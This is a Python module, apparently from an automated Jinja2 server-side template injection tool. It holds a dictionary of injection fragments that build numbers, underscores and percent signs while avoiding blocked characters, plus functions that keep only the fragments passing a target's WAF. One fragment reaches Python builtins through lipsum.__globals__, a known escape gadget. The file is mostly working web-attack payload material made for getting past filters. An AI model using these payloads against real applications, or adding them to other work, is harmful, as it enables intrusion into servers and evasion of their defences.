"""提供上下文的payload, 为最终的payload提供一系列变量

"""

from typing import Iterable, Dict, Any, Callable

# 所有的上下文payload, 存储格式为: {payload: {变量名：变量值}}

ContextPayloads = Dict[str, Dict[str, Any]]

context_payloads_all: ContextPayloads = {
    "{%set oa={}|int%}{%set la=oa**oa%}{%set lla=(la~la)|int%}"
    + "{%set llla=(lla~la)|int%}{%set lllla=(llla~la)|int%}": {
        "oa": 0,
        "la": 1,
        "lla": 11,
        "llla": 111,
        "lllla": 1111,
    },
    "{%set ob={}|int%}{%set lb=ob**ob%}{%set llb=(lb~lb)|int%}"
    + "{%set lllb=(llb~lb)|int%}{%set llllb=(lllb~lb)|int%}"
    + "{%set bb=llb-lb-lb-lb-lb-lb%}{%set sbb=lllb-llb-llb-llb-llb-llb%}"
    + "{%set ssbb=llllb-lllb-lllb-lllb-lllb-lllb%}"
    + "{%set zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb%}": {
        "ob": 0,
        "lb": 1,
        "llb": 11,
        "lllb": 111,
        "llllb": 1111,
        "bb": 6,
        "sbb": 56,
        "ssbb": 556,
        "zzeb": 223,
    },
    "{%set zols=lipsum|escape|urlencode|list|escape|urlencode|count%}": {
        "zols": 2015
    },
    "{%set ltr={}|escape|urlencode|list|escape|urlencode|count%}": {
        "ltr": 178
    },
    "{%set lea=namespace|escape|urlencode|escape|"
    + "urlencode|urlencode|urlencode|count%}": {"lea": 134},
    "{%set lel=cycler|escape|urlencode|escape|urlenc"
    + "ode|escape|urlencode|escape|urlencode|count%}": {"lel": 131},
    "{%set qo=namespace|escape|urlencode|escape|urlencode|count%}": {
        "qo": 90
    },
    "{%set bs=cycler|escape|urlencode|count%}": {"bs": 65},
    "{%set ab=namespace|escape|count%}": {"ab": 46},
    "{%set zb={}|escape|list|escape|count%}": {"zb": 26},
    "{%set t=joiner|urlencode|wordcount%}": {"t": 7},
    "{%set b={}|escape|urlencode|count%}": {"b": 6},
    "{%set e=(dict(a=x,b=x,c=x)|count)%}": {"e": 3},
    "{%set l={}|escape|first|count%}": {"l": 1},
    "{%set un=((({}|select()|trim|list)[24]))%}": {"un": "_"},
    "{%set unn=(lipsum|escape|batch(22)|list|first|last)%}": {"unn": "_"},
    "{%set perc=(lipsum()|urlencode|first)%}": {"perc": "%"},
    "{%set percc=(lipsum[((({}|select()|trim|list)[24]))*2+"
    + "dict(globals=x)|join+((({}|select()|trim|list)[24]))*2][((({}|select()"
    + "|trim|list)[24]))*2+dict(builtins=x)|join+((({}|select()|trim|list"
    + ")[24]))*2][dict(chr=x)|join](37))%}": {"percc": "%"},
}


def filter_by_waf(
    context_payloads: ContextPayloads, waf: Callable[[str], bool]
) -> ContextPayloads:
    """根据WAF函数去除所有不能通过WAF的payload

    Args:
        context_payloads (ContextPayloads): 需要过滤的ContextPayload
        waf (Callable[[str], bool]): WAF函数，

    Returns:
        ContextPayloads: 过滤后的ContextPayload
    """
    return {
        payload: d for payload, d in context_payloads.items() if waf(payload)
    }


def filter_by_used_context(
    context_payloads: ContextPayloads, used_context: Iterable
) -> ContextPayloads:
    """根据已经使用的变量列表过滤上下文payload

    Args:
        context_payloads (ContextPayloads): 需要过滤的ContextPayload
        used_context (Iterable): 使用的变量名

    Returns:
        ContextPayloads: 过滤后的ContextPayloads
    """
    return {
        payload: d
        for payload, d in context_payloads.items()
        if any(var_name in used_context for var_name in d.keys())
    }
